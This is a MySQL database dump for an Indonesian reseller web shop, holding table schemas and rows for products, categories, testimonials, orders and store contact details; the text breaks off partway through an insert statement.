/*
SQLyog Ultimate v12.5.1 (64 bit)
MySQL - 5.5.62 : Database - db_ultimate246
*********************************************************************
*/

/*!40101 SET NAMES utf8 */;

/*!40101 SET SQL_MODE=''*/;

/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
CREATE DATABASE /*!32312 IF NOT EXISTS*/`db_ultimate246` /*!40100 DEFAULT CHARACTER SET latin1 */;

/*Table structure for table `bank_accounts` */

DROP TABLE IF EXISTS `bank_accounts`;

CREATE TABLE `bank_accounts` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `bank_name` varchar(55) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `bank_account_name` varchar(155) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `bank_account_number` bigint(20) DEFAULT NULL,
  `status` enum('active','inactive') COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `bank_accounts` */

insert  into `bank_accounts`(`id`,`bank_name`,`bank_account_name`,`bank_account_number`,`status`,`created_at`,`updated_at`) values 
(1,'BCA','PT. SAN SURYA TEKNOMEDIA',8210899899,NULL,'2019-07-30 07:08:10','2019-07-30 07:08:10');

/*Table structure for table `benefitContent` */

DROP TABLE IF EXISTS `benefitContent`;

CREATE TABLE `benefitContent` (
  `id` int(191) NOT NULL AUTO_INCREMENT,
  `idProduct` int(11) DEFAULT NULL,
  `dd` int(11) unsigned NOT NULL DEFAULT '0',
  `title` varchar(191) DEFAULT NULL,
  `content` varchar(191) DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `order` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`,`dd`)
) ENGINE=MyISAM AUTO_INCREMENT=28 DEFAULT CHARSET=utf8;

/*Data for the table `benefitContent` */

insert  into `benefitContent`(`id`,`idProduct`,`dd`,`title`,`content`,`status`,`created_at`,`updated_at`,`order`) values 
(1,NULL,2,'1','Fast Respon',1,NULL,'2019-07-05 16:09:01',NULL),
(2,NULL,1,'2','Jaminan Kualitas',1,'2019-07-05 16:09:12','2019-07-05 16:09:12',NULL),
(25,68,0,'1','COD',1,'2019-08-27 07:14:37','2019-08-27 07:14:37',NULL),
(4,NULL,0,'4','3 Hari Kembali',1,'2019-07-06 03:36:24','2019-07-06 03:36:24',NULL),
(7,61,0,'Pembayaran di tempat','Pembayaran di tempat',1,'2019-08-07 02:33:28','2019-08-08 07:56:33',NULL),
(9,61,0,'jaminan kualitas','jaminan kualitas',1,'2019-08-07 02:41:26','2019-08-08 07:57:53',NULL),
(10,61,0,'Sedang Trend','Sedang Trend',1,'2019-08-07 02:59:20','2019-08-08 07:58:25',NULL),
(11,64,0,'1','Pembayaran Di Tempat',1,'2019-08-09 08:42:14','2019-08-09 08:42:14',NULL),
(12,64,0,'2','Produk Terlaris',1,'2019-08-09 08:42:29','2019-08-09 08:42:29',NULL),
(13,64,0,'3','Jaminan Kualitas',1,'2019-08-09 08:42:38','2019-08-09 08:42:38',NULL),
(14,65,0,'1','Pembayaran Di Tempat',1,'2019-08-09 09:10:12','2019-08-09 09:10:12',NULL),
(15,65,0,'2','Produk Terlaris',1,'2019-08-09 09:10:22','2019-08-09 09:10:22',NULL),
(16,65,0,'3','Jaminan Kualitas',1,'2019-08-09 09:10:32','2019-08-09 09:10:32',NULL),
(17,66,0,'1','Pembayaran di tempat',1,'2019-08-09 09:19:04','2019-08-09 09:19:04',NULL),
(18,66,0,'2','Paling Laris',1,'2019-08-09 09:19:43','2019-08-09 09:19:43',NULL),
(19,66,0,'3','Jaminan Kualitas',1,'2019-08-09 09:19:52','2019-08-09 09:19:52',NULL),
(26,68,0,'2','Terlaris',1,'2019-08-27 07:14:46','2019-08-27 07:14:46',NULL),
(22,67,0,'1','COD',1,'2019-08-13 08:43:50','2019-08-13 08:43:50',NULL),
(23,67,0,'2','Terlaris',1,'2019-08-13 08:44:35','2019-08-13 08:44:35',NULL),
(24,67,0,'3','Jaminan Kualitas',1,'2019-08-13 08:44:57','2019-08-13 08:44:57',NULL),
(27,68,0,'3','Produk Import',1,'2019-08-27 07:14:58','2019-08-27 07:14:58',NULL);

/*Table structure for table `catalogs` */

DROP TABLE IF EXISTS `catalogs`;

CREATE TABLE `catalogs` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `product_id` int(11) DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `catalogs` */

/*Table structure for table `categories` */

DROP TABLE IF EXISTS `categories`;

CREATE TABLE `categories` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(55) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `gambar` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `categories` */

insert  into `categories`(`id`,`name`,`created_at`,`updated_at`,`gambar`) values 
(2,'Jam Tangan','2019-07-24 16:22:21','2019-08-31 01:01:15','category-1567188075.jfif'),
(3,'Jam Anak','2019-07-30 08:12:53','2019-08-31 01:01:03','category-1567188063.jfif'),
(4,'Aksesoris Handphone','2019-07-30 14:17:10','2019-08-31 01:00:43','category-1567188043.jfif'),
(5,'Tas','2019-07-30 15:04:45','2019-08-31 01:01:40','category-1567188100.jfif');

/*Table structure for table `coupons` */

DROP TABLE IF EXISTS `coupons`;

CREATE TABLE `coupons` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `product_id` bigint(20) NOT NULL,
  `title` varchar(159) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `discount` int(11) NOT NULL DEFAULT '0',
  `start_date` date DEFAULT NULL,
  `end_date` date DEFAULT NULL,
  `limit` int(11) DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `coupons` */

/*Table structure for table `frontslides` */

DROP TABLE IF EXISTS `frontslides`;

CREATE TABLE `frontslides` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `reseller_id` varchar(191) DEFAULT NULL,
  `shop_id` varchar(191) DEFAULT NULL,
  `judul` varchar(55) DEFAULT NULL,
  `picture` varchar(100) DEFAULT NULL,
  `status` int(11) DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `order` int(10) DEFAULT NULL,
  `link` varchar(191) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=19 DEFAULT CHARSET=utf8;

/*Data for the table `frontslides` */

insert  into `frontslides`(`id`,`reseller_id`,`shop_id`,`judul`,`picture`,`status`,`created_at`,`updated_at`,`order`,`link`) values 
(17,NULL,'2',NULL,'slide-1567181018.jpg',1,'2019-08-30 23:03:38','2019-08-30 23:03:38',NULL,'http://tst'),
(18,NULL,'2',NULL,'slide-1567181035.jpg',1,'2019-08-30 23:03:55','2019-08-30 23:03:55',NULL,'http://tst');

/*Table structure for table `globalComment` */

DROP TABLE IF EXISTS `globalComment`;

CREATE TABLE `globalComment` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `idProduct` int(50) DEFAULT NULL,
  `title` varchar(55) DEFAULT NULL,
  `content` varchar(191) DEFAULT NULL,
  `custName` varchar(191) DEFAULT NULL,
  `dateComment` varchar(191) DEFAULT NULL,
  `picture` varchar(100) DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `order` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=45 DEFAULT CHARSET=utf8;

/*Data for the table `globalComment` */

insert  into `globalComment`(`id`,`idProduct`,`title`,`content`,`custName`,`dateComment`,`picture`,`status`,`created_at`,`updated_at`,`order`) values 
(14,NULL,'Ronie','Produk bagus... Sesuai dengan deskripsi','Ronie','0823***16',NULL,1,'2019-07-05 14:45:19','2019-07-05 14:45:19',NULL),
(15,NULL,'Gio','Barang bagus, pengiriman cepat, keren','Gio','0878***55',NULL,1,'2019-07-05 14:49:56','2019-07-05 14:49:56',NULL),
(13,NULL,'Prito','Terima kasih barang sudah sampai, recomended seller dech..pelayanan cepat','Prito','0812***56',NULL,1,'2019-07-05 14:44:37','2019-07-05 14:44:37',NULL),
(16,NULL,'Ubay','Pesanan sudah diterima thanks smoga smakin laris y kak','Ubay','0852***29',NULL,1,'2019-07-05 14:50:50','2019-07-05 14:50:50',NULL),
(17,NULL,'Lina','barang sudah sampai dengan baik, paking rapi sesuai pesanan','Lina','0823***99',NULL,1,'2019-07-05 14:51:16','2019-07-05 14:51:16',NULL),
(18,NULL,'handi','Mau komplen nih, koq barang paten sekali','handi','0811***77',NULL,1,'2019-07-05 14:52:04','2019-07-05 14:52:04',NULL),
(19,NULL,'jenny','sudah diterima dan berfungsi dengan baik. Thnaks ya kak. nanti pasti pesan lagi','jenny','0852***50',NULL,1,'2019-07-05 15:30:19','2019-07-05 15:30:19',NULL),
(20,NULL,'Rahmat','baru kasi ripiu yach, barang oke rekomen seller lah pokoknya','Rahmat','0852***55',NULL,1,'2019-07-05 15:31:13','2019-07-05 15:31:13',NULL),
(21,NULL,'Reno','mantabe bos, barang dipacking rapi, recommended bgt dah, gak yesel beli disini, next order lagi','Reno','0823***48',NULL,1,'2019-07-05 15:32:10','2019-07-05 15:32:10',NULL),
(22,NULL,'Acik','Cs nya fast respon. Pakingan rapi. Barang sesuai yg ditawarkan.','Acik','0859***87',NULL,1,'2019-07-05 15:32:44','2019-07-05 15:32:44',NULL),
(23,NULL,'Tono winata','Kualitas barang bagus dgn harga yg relevan. Puas lah dgn harga dan kualitasnya. Pengiriman tepat waktu dan bungkusan nya juga rapih sekali. Semoga laris deh dagangan nya','Tono winata','0811***20',NULL,1,'2019-07-05 15:33:12','2019-07-05 15:33:12',NULL),
(24,NULL,'Dino','Mauuu komplain... Knp barangnya bagus bner? Packaging rapi n aman.. Sesuai deskripsi barangnya.. Makasi ya gan','Dino','0823***67',NULL,1,'2019-07-05 15:33:37','2019-07-05 15:33:37',NULL),
(25,NULL,'Candra','produk sudah diterima dengan baik dan packing bagus. Belom sempat bongkar semoga hasil sesuai harapan','Candra','0813***20',NULL,1,'2019-07-05 15:34:14','2019-07-05 15:34:14',NULL),
(26,NULL,'Wika','Awalnya sempet kecewa karena barang telat nyampe. tapi setelah dibuka barangnya sesuai harapan. next mohon lebih tepat waktu y pengirimannya','Wika','0812***45',NULL,1,'2019-07-05 15:34:49','2019-07-05 15:40:03',NULL),
(27,NULL,'Billy','mantap gan barang premium harga merakyat. mantap','Billy','0852***77',NULL,1,'2019-07-05 15:35:22','2019-07-05 15:35:22',NULL),
(28,NULL,'Rianti','barang dah diterima dgn baik, super cepat dan berfungsi dgn baik, bagi yg lain terbukti the best seller, recomended !!! thanks y om','Rianti','0822***39',NULL,1,'2019-07-05 15:36:52','2019-07-05 15:36:52',NULL),
(29,NULL,'Rian','Barang Ori dan sesuai dengan keterangan Penjual respon baik, besok beli disini lagi','Rian','0857***40',NULL,1,'2019-07-05 15:38:51','2019-07-05 15:38:51',NULL),
(30,NULL,'Gardang','Barang sesuai harapan, produk tidak mengecewakan. cuma csnya sedikit lambat balas chat','Gardang','0823***29',NULL,1,'2019-07-05 15:39:29','2019-07-05 15:39:29',NULL),
(31,NULL,'Christine','gak nyesel dech jadi kado buat misua, barangnya tidak mengecewakan','Christine','0878***72',NULL,1,'2019-07-05 15:40:57','2019-07-05 15:40:57',NULL),
(32,NULL,'Antoni','Cepat respon, 1 hari sampai, barang sesuai harapan, terima kasih!','Antoni','0823***09',NULL,1,'2019-07-05 15:41:23','2019-07-05 15:41:23',NULL),
(33,NULL,'Robi','respon bagus, brg tidak ada masalah\r\ncuma sayang paking sedikit robek aja pas di terima','Robi','0853***22',NULL,1,'2019-07-05 15:42:00','2019-07-05 15:42:00',NULL),
(34,NULL,'Gunawan','barang ori, packing rapih, nanti pasti beli lagi','Gunawan','0812***33',NULL,1,'2019-07-05 15:42:40','2019-07-05 15:42:40',NULL),
(35,NULL,'Charles','Barang sehari sudah sampai, sesuai dgn yg tertera di web','Charles','0819***88',NULL,1,'2019-07-05 15:43:40','2019-07-05 15:43:40',NULL),
(36,NULL,'Devan','respon cepat ,kualitas bagus recommended seller','Devan','0822***88',NULL,1,'2019-07-05 15:44:22','2019-07-05 15:44:22',NULL),
(37,NULL,'Indri','Packing nya rapih, bass nya juga kerasa, intinya the best lah','Indri','0821***68',NULL,1,'2019-07-05 15:45:11','2019-07-05 15:45:11',NULL),
(38,NULL,'Krisna','Recommend Seller ini. Fast response... Barang cukup baik dengan harga segitu. Yg penting jagoan gw seneng','Krisna','0819***22',NULL,1,'2019-07-05 15:45:40','2019-07-05 15:45:40',NULL),
(39,NULL,'Susan','barang sdah nyampai. pengiriman cepat. Nerima reseller gak yach ?','Susan','0853***09',NULL,1,'2019-07-05 15:46:17','2019-07-05 15:46:17',NULL),
(40,NULL,'Damar','respon cepat, barang sesuai,. tinggal dicoba saja,semoga OK punya.','Damar','0813***49',NULL,1,'2019-07-05 15:47:10','2019-07-05 15:47:10',NULL),
(41,NULL,'Beni','Sudah order yang kedua kalinya, brg blom mengecewakan sampai saat ini','Beni','0819***85',NULL,1,'2019-07-05 15:47:50','2019-07-05 15:47:50',NULL),
(42,NULL,'Roma','Barang sdah sampai, nanti psti ngajak kawan beli disini dech','Roma','0896***18',NULL,1,'2019-07-05 15:48:42','2019-07-05 15:48:42',NULL),
(43,NULL,'Dandi','orderan sudah saya terima dengan rapi, bulan depan pasti beli lagi karena ada produk yg diincer','Dandi','0812***72',NULL,1,'2019-07-05 15:49:10','2019-07-05 15:49:10',NULL),
(44,NULL,'Rena','respon oke, barang juga bagus koq.','Rena','0878***09',NULL,1,'2019-07-05 15:49:54','2019-07-05 15:49:54',NULL);

/*Table structure for table `globalFooter` */

DROP TABLE IF EXISTS `globalFooter`;

CREATE TABLE `globalFooter` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `idProduct` int(50) DEFAULT NULL,
  `title` varchar(55) DEFAULT NULL,
  `content` varchar(191) DEFAULT NULL,
  `custName` varchar(191) DEFAULT NULL,
  `dateComment` varchar(191) DEFAULT NULL,
  `picture` varchar(100) DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `order` int(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=18 DEFAULT CHARSET=utf8;

/*Data for the table `globalFooter` */

insert  into `globalFooter`(`id`,`idProduct`,`title`,`content`,`custName`,`dateComment`,`picture`,`status`,`created_at`,`updated_at`,`order`) values 
(14,NULL,'2','Layanan Pelanggan : WA : 0822-8340-1530',NULL,NULL,NULL,1,'2019-07-06 04:07:52','2019-07-06 04:07:52',NULL),
(13,NULL,'1','Follow IG : @sanporium_official',NULL,NULL,NULL,1,'2019-07-06 04:07:41','2019-07-29 17:33:39',NULL),
(15,NULL,'3','Metode Pengiriman : JNE | Lion Parcel | POS|J&T',NULL,NULL,NULL,1,'2019-07-06 04:08:03','2019-08-09 08:43:42',NULL),
(16,NULL,'4','Metode Pembayaran : BCA | MANDIRI|COD',NULL,NULL,NULL,1,'2019-07-06 04:08:35','2019-08-09 08:44:24',NULL),
(17,NULL,'5','Sanporium Melakukan Pengiriman H+1 Setelah Pembayaran Diterima.',NULL,NULL,NULL,1,'2019-07-06 04:08:47','2019-07-06 04:08:47',NULL);

/*Table structure for table `migrations` */

DROP TABLE IF EXISTS `migrations`;

CREATE TABLE `migrations` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `migration` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=44 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `migrations` */

insert  into `migrations`(`id`,`migration`,`batch`) values 
(23,'2014_10_12_000000_create_users_table',1),
(24,'2014_10_12_100000_create_password_resets_table',1),
(25,'2019_06_13_090546_create_products_table',1),
(26,'2019_06_14_142532_create_product_assets_table',1),
(27,'2019_06_14_142905_create_product_stocks_table',1),
(28,'2019_06_24_154756_create_resellers_table',1),
(29,'2019_06_24_155800_create_wallets_table',1),
(30,'2019_06_24_224901_create_wallet_activities_table',1),
(31,'2019_06_24_230752_create_reseller_packages_table',1),
(32,'2019_06_25_032436_create_roles_table',1),
(33,'2019_07_06_062217_create_orders_table',1),
(34,'2019_07_07_025129_create_categories_table',1),
(35,'2019_07_09_152218_create_catalogs_table',1),
(36,'2019_07_09_152710_create_coupons_table',1),
(37,'2019_07_11_164755_create_reseller_dashboards_table',1),
(38,'2019_07_12_171136_create_shops_table',1),
(39,'2019_07_12_171504_create_user_addresses_table',1),
(40,'2019_07_12_174841_create_product_prices_table',1),
(41,'2019_07_12_175236_create_shop_products_table',1),
(42,'2019_07_13_122000_create_bank_accounts_table',1),
(43,'2019_07_16_224026_create_order_details_table',2);

/*Table structure for table `order_details` */

DROP TABLE IF EXISTS `order_details`;

CREATE TABLE `order_details` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `order_id` bigint(20) NOT NULL,
  `product_id` bigint(20) DEFAULT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `order_type` enum('product','shipping','payment','discount') COLLATE utf8mb4_unicode_ci NOT NULL,
  `amount` decimal(22,2) NOT NULL DEFAULT '0.00',
  `quantity` int(11) NOT NULL DEFAULT '0',
  `order_status` enum('prospect','pending','paid','processing','packing','delivering','success','failed','canceled') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'prospect',
  `shipping_status` text COLLATE utf8mb4_unicode_ci,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `profit` double NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=64 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `order_details` */

insert  into `order_details`(`id`,`order_id`,`product_id`,`name`,`order_type`,`amount`,`quantity`,`order_status`,`shipping_status`,`created_at`,`updated_at`,`profit`) values 
(1,1,16,'jne-29500','shipping',29500.00,1,'pending',NULL,'2019-08-14 12:37:08','2019-08-14 12:37:52',50000),
(2,2,15,'jne-43000','shipping',43000.00,1,'pending',NULL,'2019-08-14 12:57:33','2019-08-14 12:58:12',50000),
(3,3,15,'jne-144000','shipping',144000.00,1,'pending',NULL,'2019-08-14 13:22:28','2019-08-14 13:23:11',50000),
(4,4,17,'jne-7000','shipping',7000.00,1,'prospect',NULL,'2019-08-14 13:48:58','2019-08-14 14:06:15',50000),
(5,6,16,'Product','product',205000.00,1,'prospect',NULL,'2019-08-14 14:25:01','2019-08-14 14:25:20',50000),
(6,7,17,'jne-49000','shipping',49000.00,1,'prospect',NULL,'2019-08-14 14:32:36','2019-08-23 10:37:49',50000),
(7,7,16,'jne-7000','shipping',7000.00,1,'pending',NULL,'2019-08-14 15:08:22','2019-08-14 15:09:05',50000),
(8,9,12,'Product','product',180000.00,1,'pending',NULL,'2019-08-14 16:11:33','2019-08-14 16:11:33',50000),
(9,9,11,'Product','product',278000.00,1,'pending',NULL,'2019-08-14 16:11:39','2019-08-14 16:11:39',40000),
(10,10,12,'Product','product',285000.00,1,'pending',NULL,'2019-08-18 18:48:27','2019-08-18 18:48:27',18000),
(18,13,25,'Product','product',265000.00,2,'pending',NULL,'2019-08-19 16:28:21','2019-08-20 09:37:05',120000),
(19,13,49,'Product','product',396000.00,3,'pending',NULL,'2019-08-20 09:30:51','2019-08-20 10:17:37',180000),
(20,13,46,'Product','product',345000.00,2,'pending',NULL,'2019-08-20 09:30:54','2019-08-20 10:18:05',120000),
(21,13,44,'Product','product',195000.00,2,'pending',NULL,'2019-08-20 10:17:06','2019-08-20 10:17:59',120000),
(22,13,23,'Product','product',265000.00,1,'pending',NULL,'2019-08-20 10:17:49','2019-08-20 10:17:49',60000),
(26,14,44,'jne-59000','shipping',59000.00,1,'pending',NULL,'2019-08-21 13:11:57','2019-08-21 13:12:49',35000),
(27,15,22,'jne-7000','shipping',7000.00,1,'pending',NULL,'2019-08-21 13:19:00','2019-08-21 13:20:34',54000),
(28,13,43,'Product','product',195000.00,1,'pending',NULL,'2019-08-22 16:52:33','2019-08-22 16:52:33',60000),
(29,7,47,'Product','product',285000.00,1,'prospect',NULL,'2019-08-23 10:37:32','2019-08-23 10:37:49',30000),
(30,7,46,'Product','product',320000.00,1,'prospect',NULL,'2019-08-23 10:37:34','2019-08-23 10:37:49',30000),
(32,17,46,'Product','product',340000.00,3,'pending',NULL,'2019-08-23 11:16:40','2019-08-23 11:17:34',165000),
(33,17,45,'Product','product',340000.00,1,'pending',NULL,'2019-08-23 11:16:43','2019-08-23 11:16:43',67000),
(34,18,13,'jne-7000','shipping',220000.00,1,'pending',NULL,'2019-08-25 20:10:09','2019-08-25 20:12:56',78000),
(35,19,52,'Product','product',365000.00,2,'pending',NULL,'2019-08-26 15:46:09','2019-08-26 15:46:14',180000),
(36,19,51,'Product','product',352000.00,2,'pending',NULL,'2019-08-26 15:46:17','2019-08-26 15:51:02',138000),
(38,20,35,'jne-7000','shipping',7000.00,1,'pending',NULL,'2019-08-27 12:38:08','2019-08-27 12:39:17',40000),
(45,11,14,'jne-7000','shipping',7000.00,1,'pending',NULL,'2019-08-28 15:17:12','2019-08-28 15:19:35',0),
(46,11,16,'jne-7000','shipping',7000.00,1,'pending',NULL,'2019-08-28 15:17:23','2019-08-28 15:19:35',38000),
(49,22,26,'jne-83000','shipping',83000.00,1,'prospect',NULL,'2019-08-28 15:30:54','2019-08-28 15:46:30',82000),
(53,22,49,'Product','product',400000.00,1,'prospect',NULL,'2019-08-28 15:44:55','2019-08-28 15:46:30',64000),
(59,24,14,'jne-7000','shipping',7000.00,1,'pending',NULL,'2019-08-30 16:02:19','2019-08-30 16:06:37',87000),
(60,24,19,'jne-7000','shipping',7000.00,1,'pending',NULL,'2019-08-30 16:02:52','2019-08-30 16:06:37',50000),
(62,24,15,'jne-7000','shipping',7000.00,1,'pending',NULL,'2019-08-30 16:04:00','2019-08-30 16:06:37',118000);

/*Table structure for table `orders` */

DROP TABLE IF EXISTS `orders`;

CREATE TABLE `orders` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `product_id` bigint(20) DEFAULT NULL,
  `shop_id` bigint(20) DEFAULT NULL,
  `user_id` bigint(20) DEFAULT NULL,
  `reseller_id` bigint(20) DEFAULT NULL,
  `address_id` bigint(20) DEFAULT NULL,
  `quantity` int(11) NOT NULL DEFAULT '0',
  `amount` decimal(22,2) NOT NULL DEFAULT '0.00',
  `profit` double DEFAULT NULL,
  `order_status` enum('pending','paid','processing','packing','delivering','success','failed','canceled') COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'pending',
  `payment_method` varchar(55) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `payment_reference` text COLLATE utf8mb4_unicode_ci,
  `shipping_method` varchar(55) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `shipping_status` text COLLATE utf8mb4_unicode_ci,
  `invoice_number` varchar(29) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `shipping_package` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `shipping_price` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `payment_image` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=25 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `orders` */

insert  into `orders`(`id`,`product_id`,`shop_id`,`user_id`,`reseller_id`,`address_id`,`quantity`,`amount`,`profit`,`order_status`,`payment_method`,`payment_reference`,`shipping_method`,`shipping_status`,`invoice_number`,`created_at`,`updated_at`,`shipping_package`,`shipping_price`,`payment_image`) values 
(10,12,27,41,41,NULL,1,285000.00,NULL,'success',NULL,NULL,NULL,NULL,'INV31368','2019-08-18 18:48:26','2019-08-28 15:17:00',NULL,NULL,NULL),
(11,19,33,47,47,20,1,232000.00,NULL,'success','Bank Transfer','1','jne',NULL,'INV17928','2019-08-19 11:01:38','2019-08-28 15:23:59','7000','7000',NULL),
(15,22,10,77,21,14,1,159000.00,NULL,'pending','Bank Transfer','1','jne',NULL,'INV33719','2019-08-21 13:18:53','2019-08-21 13:19:16','7000','7000',NULL),
(16,48,29,61,43,NULL,1,205000.00,NULL,'pending',NULL,NULL,NULL,NULL,'INV36029','2019-08-22 10:20:53','2019-08-22 10:20:53',NULL,NULL,NULL),
(18,13,14,50,28,16,1,220000.00,NULL,'success','Bank Transfer','1','jne',NULL,'INV76920','2019-08-25 20:06:47','2019-08-27 10:02:16','7000','7000','payment-1566741848.jpg'),
(21,49,4,60,15,19,1,396000.00,NULL,'pending','Bank Transfer','1','jne',NULL,'INV89539','2019-08-28 15:13:01','2019-08-28 15:17:04',NULL,NULL,NULL),
(22,20,23,2,37,21,1,300000.00,NULL,'pending','Bank Transfer','1','jne',NULL,'INV76032','2019-08-28 15:30:53','2019-08-28 15:31:13','83000','83000',NULL),
(23,46,4,15,15,NULL,1,345000.00,NULL,'pending','Bank Transfer','1',NULL,NULL,'INV96684','2019-08-28 15:46:01','2019-08-28 15:47:35',NULL,NULL,NULL),
(24,14,33,47,47,22,1,350000.00,NULL,'pending','Bank Transfer','1','jne',NULL,'INV76769','2019-08-30 16:02:06','2019-08-30 16:04:28','7000','7000',NULL);

/*Table structure for table `password_resets` */

DROP TABLE IF EXISTS `password_resets`;

CREATE TABLE `password_resets` (
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  KEY `password_resets_email_index` (`email`(191))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

/*Data for the table `password_resets` */

/*Table structure for table `productPicture` */

DROP TABLE IF EXISTS `productPicture`;

CREATE TABLE `productPicture` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `idProduct` int(50) DEFAULT NULL,
  `title` varchar(55) DEFAULT NULL,
  `price` varchar(55) DEFAULT NULL,
  `picture_note` text,
  `content_detail` text,
  `picture` varchar(100) DEFAULT NULL,
  `status` int(11) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `order` int(10) DEFAULT NULL,
  `type` varchar(191) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=325 DEFAULT CHARSET=utf8;

/*Data for the table `productPicture` */

insert  into `productPicture`(`id`,`idProduct`,`title`,`price`,`picture_note`,`content_detail`,`picture`,`status`,`created_at`,`updated_at`,`order`,`type`) values 
(30,30,'7',NULL,'7',NULL,'1562322634.JPG',1,'2019-07-05 10:30:34','2019-07-05 10:30:34',NULL,'content'),
(37,30,'11',NULL,'11',NULL,'1562386960.JPG',1,'2019-07-06 04:22:40','2019-07-06 04:22:40',NULL,'content'),
(29,30,'6',NULL,'6',NULL,'1562322583.jpg',1,'2019-07-05 10:29:43','2019-07-05 10:29:43',NULL,'content'),
(22,30,'1',NULL,'1',NULL,'1562321626.JPG',1,'2019-07-05 10:13:46','2019-07-05 10:13:46',NULL,'slide'),
(23,30,'2',NULL,'2',NULL,'1562321734.jpg',1,'2019-07-05 10:15:34','2019-07-05 10:15:34',NULL,'slide'),
(24,30,'3',NULL,'3',NULL,'1562321885.jpg',1,'2019-07-05 10:18:05','2019-07-05 10:18:05',NULL,'slide'),
(25,30,'4',NULL,'4',NULL,'1562322463.JPG',1,'2019-07-05 10:27:43','2019-07-05 10:27:43',NULL,'content'),
(26,30,'5',NULL,'5',NULL,'1562322481.jpg',1,'2019-07-05 10:28:01','2019-07-05 10:28:01',NULL,'content'),
